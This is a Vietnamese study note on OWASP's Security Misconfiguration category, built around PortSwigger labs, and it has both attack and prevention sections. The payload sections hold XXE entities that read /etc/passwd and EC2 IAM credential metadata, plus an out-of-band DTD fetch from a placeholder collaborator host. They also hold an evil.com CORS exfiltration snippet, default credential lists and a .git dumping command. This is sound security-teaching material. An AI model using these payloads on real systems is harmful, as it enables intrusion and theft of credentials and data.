# A02 – Security Misconfiguration

> **OWASP Top 10:2025 · #2** — Nhảy từ vị trí #5 (2021) lên #2. 100% ứng dụng được kiểm tra đều có ít nhất một dạng misconfiguration. Sự bùng nổ của cloud, container, và Infrastructure as Code đã mở rộng attack surface đến mức các lỗi cấu hình hiện vượt nhiều lỗi code-level về tần suất xuất hiện.

| Metric | Số liệu |
|---|---|
| CWE được map | 16 |
| CVEs liên quan | 1,375 |
| Tổng số lần xuất hiện | 719,084 |
| Tỉ lệ xuất hiện trung bình | 3.00% |

Notable CWEs: **CWE-16** (Configuration), **CWE-611** (XXE), **CWE-489** (Active Debug Code), **CWE-942** (Permissive CORS Policy).

---

## 📖 Concept

Security Misconfiguration xảy ra khi hệ thống, ứng dụng, hoặc cloud service **được cấu hình sai về mặt bảo mật** — không phải do code có bug, mà do **những gì bị để mặc định, bỏ quên, hoặc không tắt đi**.

> ⚠️ Không như injection hay logic bug, misconfiguration thường không cần kỹ thuật cao để exploit. Attacker chỉ cần tìm đúng nơi bị bỏ ngỏ.

### Ứng dụng có thể bị tấn công nếu:

| Dấu hiệu | Ví dụ |
|---|---|
| Thiếu security hardening | Không set security headers, dùng default config của framework |
| Tính năng không cần thiết vẫn bật | Debug mode bật ở production, port dịch vụ thừa mở |
| Default credential chưa đổi | `admin:admin`, `admin:password` trên admin panel |
| Error message quá chi tiết | Stack trace, version info, path lộ ra response |
| Security feature bị tắt sau upgrade | Backward compat override secure config |
| Cloud permission quá rộng | S3 bucket public, IAM role over-permissive |
| Thiếu security headers | Không có `CSP`, `X-Frame-Options`, `HSTS` |
| XML parser chưa disable external entity | XXE vulnerability |

---

## 🎯 Các dạng tấn công

### 1. Default Credentials — `Critical`

Admin panel, framework console, database dashboard giữ nguyên credential mặc định.

```
# Các credential phổ biến bị thử đầu tiên
admin:admin
admin:password
admin:123456
root:root
tomcat:tomcat  (Apache Tomcat Manager)
admin:admin123 (Jenkins)
```

> 💡 Không chỉ username/password — còn có API key mặc định, secret key cứng trong code, token trong config file.

---

### 2. Verbose Error Messages / Information Disclosure — `High`

App để lộ thông tin nhạy cảm qua error response.

```
# Gửi request với input sai kiểu dữ liệu
GET /product?productId="example" HTTP/1.1

# Response lộ stack trace:
java.lang.NumberFormatException: For input string: "example"
    at org.apache.struts2.dispatcher... (Apache Struts 2 2.3.31)
    at com.example.ProductController.getProduct(ProductController.java:42)
    ...
```

Thông tin attacker thu được:
- **Framework version** → tra CVE
- **File path** → cấu trúc thư mục server
- **Database type** → target SQL injection
- **Internal IP/hostname** → recon network nội bộ

---

### 3. Debug / Development Features Bật ở Production — `High`

```
# phpinfo() còn chạy ở production
GET /cgi-bin/phpinfo.php

# Spring Boot Actuator endpoint exposed
GET /actuator/env        → lộ environment variables
GET /actuator/heapdump   → dump toàn bộ heap memory
GET /actuator/mappings   → lộ tất cả URL routes

# Django DEBUG=True
GET /nonexistent-path    → full stack trace + settings leak
```

---

### 4. Exposed Sensitive Files — `High`

File backup, config, source code, hoặc version control bị để lộ trên web server.

```
# Backup files
/index.php.bak
/config.php~
/web.config.bak
/backup/ProductTemplate.java.bak

# Git repo exposed
/.git/                   → clone toàn bộ source code
/.git/config
/.git/COMMIT_EDITMSG

# Environment files
/.env                    → DB password, API key, secret
/.env.production

# Config files
/config.yml
/application.properties
/database.yml

# Kiểm tra robots.txt trước
/robots.txt              → thường reveal hidden dirs
```

**Attack flow – .git exposed:**
```bash
# Download toàn bộ repo
wget -r https://TARGET/.git/

# Xem commit history
git log --oneline

# Tìm secret bị xóa nhưng vẫn còn trong diff
git diff <commit-id>
# → Reveal hard-coded admin password trong config
```

---

### 5. XXE (XML External Entity) Injection — `High`

XML parser cho phép external entity → attacker đọc file nội bộ hoặc thực hiện SSRF.

```xml
<!-- Request bình thường -->
POST /api/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<stockCheck><productId>1</productId></stockCheck>

<!-- Inject external entity để đọc file -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>

<!-- XXE → SSRF: truy cập EC2 metadata -->
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
```

> 💡 XXE không chỉ xuất hiện trong request XML rõ ràng. SVG upload, DOCX/XLSX parse, SOAP API — tất cả đều có thể là attack surface.

---

### 6. Security Headers Thiếu hoặc Sai — `Medium`

```http
# Response thiếu security headers → nhiều attack vector mở
HTTP/1.1 200 OK
Content-Type: text/html
# Không có:
# Strict-Transport-Security
# Content-Security-Policy
# X-Frame-Options
# X-Content-Type-Options
# Permissions-Policy
```

| Header | Thiếu header → risk |
|---|---|
| `Content-Security-Policy` | XSS, data injection |
| `X-Frame-Options` | Clickjacking |
| `Strict-Transport-Security` | Downgrade attack, MITM |
| `X-Content-Type-Options` | MIME sniffing attack |
| `Referrer-Policy` | Leak URL sensitive trong Referer |

---

### 7. Directory Listing Enabled — `Medium`

```
# Server liệt kê toàn bộ file trong thư mục
GET /uploads/ HTTP/1.1

# Response:
Index of /uploads
../
user_data_export.csv    2024-01-15  2.3M
internal_report.pdf     2024-01-10  890K
backup_2023.sql         2023-12-31  45M   ← jackpot
```

---

### 8. CORS Misconfiguration — `Medium`

```http
# Server phản chiếu origin tùy tiện
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**Kết hợp với XSS hoặc từ malicious site:**
```javascript
// evil.com gọi API authenticated của victim
fetch('https://target.com/api/userdata', {
  credentials: 'include'  // gửi cookie của victim
}).then(r => r.text()).then(data => exfiltrate(data))
```

---

### ⚠️ Hai dạng hay bị bỏ sót

**Cloud Storage Public** — S3 bucket, Azure Blob, GCS bucket bật public read/write do default hoặc misconfigured ACL. Dữ liệu nhạy cảm bị index bởi search engine.

**HTTP TRACE Method** — Server bật TRACE → attacker dùng để đọc custom header nội bộ (ví dụ `X-Custom-IP-Authorization`) mà frontend tự thêm vào, bypass auth check.

```http
TRACE /admin HTTP/1.1
Host: target.com

# Response mirror lại toàn bộ request, bao gồm header nội bộ:
X-Custom-IP-Authorization: 203.0.113.5
```

---

## 🔍 Dấu hiệu nhận biết

| Mức độ | Dấu hiệu | Cần làm |
|---|---|---|
| 🔴 High | Stack trace / framework version trong error response | Trigger lỗi bằng input sai type, đường dẫn không tồn tại |
| 🔴 High | `.env`, `.git`, `/backup` accessible | Thử trực tiếp, check robots.txt trước |
| 🔴 High | Admin panel với default credential | Thử `admin:admin`, tra default cred của product |
| 🔴 High | Actuator/debug endpoint lộ | Fuzz `/actuator`, `/debug`, `/phpinfo.php` |
| 🟡 Med | Security headers thiếu | Check response header bằng curl hoặc securityheaders.com |
| 🟡 Med | CORS phản chiếu origin tùy tiện | Test `Origin: https://evil.com`, xem response |
| 🟡 Med | Directory listing bật | Browse thẳng đến `/uploads/`, `/backup/`, `/files/` |
| 🟡 Med | XML endpoint nhận dữ liệu từ client | Thử inject DOCTYPE + external entity |
| 🔵 Low | Server header lộ version | `Server: Apache/2.4.49` → tra CVE ngay |
| 🔵 Low | HTTP TRACE bật | Gửi `TRACE /` và check response |

---

## 🧠 Attack Flow – Methodology

### Information Disclosure / Exposed Files

```
1. Recon passive
   └─ Xem robots.txt, sitemap.xml
   └─ Check HTML/JS source comment
   └─ Burp → "Find comments" + "Discover content"

2. Probe error messages
   └─ Gửi request với wrong type: ?id="abc", ?id=../../../
   └─ Thử path không tồn tại → xem response
   └─ Tìm version info, path, framework trong error

3. Fuzz hidden files/dirs
   └─ ffuf với SecLists: common.txt, web-content/
   └─ Target: /.git/, /.env, /backup/, /phpinfo.php
   └─ Tìm file .bak, ~, .old, .swp

4. Khai thác nếu .git exposed
   └─ wget -r https://TARGET/.git/
   └─ git log + git diff → tìm secret bị commit rồi xóa
```

### XXE Testing

```
1. Tìm endpoint nhận XML
   └─ Burp history: filter Content-Type: application/xml, text/xml
   └─ Thử đổi JSON sang XML nếu server accept
   └─ Kiểm tra SVG upload, DOCX/XLSX import

2. Test basic XXE
   └─ Inject DOCTYPE với entity trỏ đến file:///etc/passwd
   └─ Observe response: entity có được resolve không?

3. Escalate
   └─ Đọc file nhạy cảm: /etc/passwd, /proc/self/environ
   └─ XXE → SSRF: trỏ entity đến http://169.254.169.254
   └─ Blind XXE: dùng out-of-band với Burp Collaborator

4. Nếu XML không visible trong request
   └─ SVG upload: tạo SVG chứa DOCTYPE + entity
   └─ Content-Type: text/xml thay JSON
```

### Security Headers Check

```
1. curl -I https://target.com
2. Paste vào securityheaders.com
3. Check CSP: missing → XSS surface
4. Check CORS: curl với -H "Origin: https://evil.com"
5. Check HSTS: không có → downgrade attack possible
```

---

## 💣 Payloads

### Information Disclosure

```http
# Trigger verbose error
GET /product?productId="test" HTTP/1.1
GET /product?productId=../../../../etc/passwd HTTP/1.1
GET /nonexistent HTTP/1.1

# Debug endpoints
GET /cgi-bin/phpinfo.php HTTP/1.1
GET /actuator/env HTTP/1.1
GET /actuator/heapdump HTTP/1.1
GET /console HTTP/1.1         # Struts, H2 DB Console
GET /manager/html HTTP/1.1    # Tomcat Manager

# Exposed files
GET /.git/config HTTP/1.1
GET /.env HTTP/1.1
GET /robots.txt HTTP/1.1
GET /backup/ HTTP/1.1
GET /web.config HTTP/1.1
GET /WEB-INF/web.xml HTTP/1.1
```

### XXE Injection

```xml
<!-- Basic: đọc file -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><field>&xxe;</field></data>

<!-- XXE → SSRF: EC2 metadata -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data><field>&xxe;</field></data>

<!-- XXE qua SVG upload -->
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- Blind XXE: out-of-band exfil -->
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.net/evil.dtd">
  %xxe;
]>
<data><field>test</field></data>
```

### CORS Misconfiguration Test

```bash
# Test origin reflection
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=<token>" \
     -I https://target.com/api/userdata

# Nếu response có:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → CORS misconfiguration confirmed
```

### HTTP TRACE Method

```http
TRACE / HTTP/1.1
Host: target.com

# Response sẽ mirror lại request, bao gồm header nội bộ
# Tìm: X-Custom-IP-Authorization, X-Forwarded-For, Authorization
```

---

## 🛡️ Prevention

### Nguyên tắc: Hardening by Default

> Mọi môi trường production phải được cấu hình từ đầu với tư duy "least privilege, minimum exposure". Đừng deploy rồi mới tắt feature — tắt trước, bật khi thực sự cần.

### Checklist cho developer

- [ ] **Tắt debug mode** ở production (`DEBUG=False`, xóa `/phpinfo.php`)
- [ ] **Đổi default credential** của tất cả admin panel, DB, framework console
- [ ] **Disable directory listing** trong web server config
- [ ] **Set security headers** đầy đủ: CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- [ ] **Disable XML external entity** processing ở tất cả XML parser
- [ ] **Tắt HTTP methods** không dùng: TRACE, OPTIONS (nếu không cần)
- [ ] **Xóa sample app**, default page, framework demo trước khi go-live
- [ ] **Restrict cloud storage** permission — không để S3/blob public mặc định
- [ ] **Không commit secret** vào git — dùng secret manager (AWS Secrets Manager, Vault)
- [ ] **Log và alert** khi phát hiện truy cập vào endpoint nhạy cảm

### Hardening: Security Headers

```http
# Thêm vào tất cả response
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=()
```

### Fix XXE

```java
// Java: Disable external entity
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Python: dùng defusedxml thay vì xml.etree.ElementTree
import defusedxml.ElementTree as ET
tree = ET.parse(xml_input)  # Safe by default
```

### Bad vs Good

```python
# ❌ Debug mode bật ở production
DEBUG = True   # Django settings.py

# ✅
DEBUG = False
ALLOWED_HOSTS = ['yourdomain.com']
```

```yaml
# ❌ S3 bucket public
{
  "Effect": "Allow",
  "Principal": "*",   # anyone!
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::my-bucket/*"
}

# ✅ Restrict theo role
{
  "Effect": "Allow",
  "Principal": { "AWS": "arn:aws:iam::123456789:role/AppRole" },
  "Action": "s3:GetObject",
  "Resource": "arn:aws:s3:::my-bucket/*"
}
```

---

## 🧪 Labs – PortSwigger Web Security Academy

### Information Disclosure

Nên làm theo thứ tự từ Apprentice → Practitioner.

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Information disclosure in error messages](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages) | 🟡 Apprentice | Verbose error → framework version leak |
| [Information disclosure on debug page](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page) | 🟡 Apprentice | phpinfo.php leak, SECRET_KEY exposure |
| [Source code disclosure via backup files](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files) | 🟡 Apprentice | robots.txt → backup dir → hardcoded DB password |
| [Authentication bypass via information disclosure](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass) | 🟡 Apprentice | TRACE method → lộ custom internal header → bypass auth |
| [Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history) | 🔴 Practitioner | .git exposed → git diff → admin password trong commit |

### XXE Injection

| Lab | Level | Kỹ thuật |
|---|---|---|
| [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files) | 🟡 Apprentice | External entity → đọc /etc/passwd |
| [Exploiting XXE to perform SSRF](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf) | 🟡 Apprentice | XXE → SSRF → EC2 metadata → IAM key |
| [Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload) | 🔴 Practitioner | SVG upload → XXE → đọc /etc/hostname |

---

## 🔧 Tools

| Tool | Mục đích |
|---|---|
| **Burp Suite – Scanner** | Tự động phát hiện missing headers, debug info, directory listing |
| **Burp – "Find comments"** | Tìm HTML comment chứa path ẩn, debug link |
| **Burp – "Discover content"** | Brute-force hidden file và thư mục |
| **Burp Collaborator** | Phát hiện blind XXE, out-of-band interaction |
| **ffuf** | Fuzz endpoint ẩn với SecLists wordlist |
| **nuclei** | Template-based scan: default cred, exposed panels, misconfig |
| **git-dumper** | Clone .git directory bị exposed (`pip install git-dumper`) |
| **securityheaders.com** | Check đầy đủ security headers của một domain |
| **truffleHog / gitleaks** | Scan git history tìm secret bị commit |

---

## 🌍 Real-world Cases

**Case 1 – Debug page lộ SECRET_KEY**

App production để nguyên `/cgi-bin/phpinfo.php`. Page này hiển thị toàn bộ environment variable bao gồm `SECRET_KEY` dùng để sign session token. Attacker dùng key này để forge session hợp lệ với quyền admin — không cần crack hay brute-force gì cả.

**Case 2 – .git exposed → source code + password**

Server deploy bằng cách copy thư mục project, vô tình include cả `.git/`. Attacker dùng `git-dumper` clone về, chạy `git log` thấy commit "Remove admin password from config". `git diff` trên commit đó lộ ra password admin cứng trong `admin.conf` — password đã bị xóa khỏi code nhưng vẫn tồn tại trong git history.

**Case 3 – robots.txt leak → backup file → hardcoded DB credential**

`robots.txt` chứa entry `Disallow: /backup`. Attacker truy cập `/backup/` — directory listing bật → thấy `ProductTemplate.java.bak`. File này chứa connection string DB với password cứng, cho phép attacker kết nối thẳng đến production database.

**Case 4 – TRACE method → internal header leak → auth bypass**

Admin panel check `X-Custom-IP-Authorization` header để verify request từ internal network. Header này được frontend proxy tự thêm. Gửi `TRACE /admin` → server mirror lại request kèm header nội bộ → attacker biết tên header → tự thêm `X-Custom-IP-Authorization: 127.0.0.1` → bypass auth check.

**Case 5 – S3 bucket public (Twitch, 2021)**

Source code Twitch bị leak qua GitHub repository được cấu hình với public access do misconfiguration. Root cause: default permission không được review, không có automated check trong CI/CD pipeline.

---

## 💡 Attacker Mindset

> **"Trước khi tìm bug trong code, hãy tìm bug trong config."**

Misconfiguration thường không cần kỹ thuật cao — chỉ cần biết đúng chỗ để nhìn. Một file `.env` public hay admin panel với `admin:admin` có thể bypass toàn bộ security design của ứng dụng.

> **"Error message là gift từ developer."**

Stack trace, framework version, file path trong error response giúp attacker nhảy thẳng đến exploit thay vì phải recon mù. Luôn trigger lỗi bằng cách inject wrong type, path traversal, hay input bất thường.

> **"robots.txt không ẩn, nó chỉ nhắc nhở."**

`Disallow` trong robots.txt là danh sách path nhạy cảm do chính developer viết ra. Đây là checklist recon miễn phí.

> **"Mọi XML parser đều có thể là XXE sink — kể cả khi không thấy XML."**

SVG upload, DOCX import, SOAP endpoint, feed parser — tất cả đều process XML. Nếu server nhận file hoặc data được parse thành XML, đó là attack surface cần test.

---

## ✅ Quick Pentest Checklist

- [ ] Check `robots.txt`, `sitemap.xml`, HTML source comment
- [ ] Fuzz hidden files: `/.env`, `/.git/`, `/backup/`, `/.DS_Store`
- [ ] Trigger error với wrong-type input → xem stack trace
- [ ] Browse debug endpoints: `/phpinfo.php`, `/actuator/`, `/console`
- [ ] Thử default credential trên login page, admin panel
- [ ] Check response headers: thiếu CSP, HSTS, X-Frame-Options?
- [ ] Test CORS: thêm `Origin: https://evil.com` vào request
- [ ] Gửi `TRACE /` — server có reflect internal header không?
- [ ] Test XML endpoint với DOCTYPE injection
- [ ] Check cloud storage: thử truy cập S3/blob URL không cần auth

---

*Nguồn: [OWASP Top 10:2025 – A02](https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/) · [PortSwigger – Information Disclosure](https://portswigger.net/web-security/information-disclosure) · [PortSwigger – XXE Injection](https://portswigger.net/web-security/xxe)*
